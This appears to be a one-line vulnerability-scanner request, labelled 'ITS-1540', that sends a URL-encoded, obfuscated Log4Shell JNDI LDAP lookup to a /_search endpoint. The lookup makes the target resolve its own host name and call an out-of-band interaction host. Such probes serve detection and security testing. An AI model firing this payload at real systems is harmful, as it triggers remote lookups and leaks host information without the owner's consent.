# Vulnerable: ITS-1540
GET /_search?a=$%7Bjndi%3Aldap%3A%2F%2F$%7B%3A-{{rand1}}%7D$%7B%3A-{{rand2}}%7D.$%7BhostName%7D.search.{{interactsh-url}}%7D
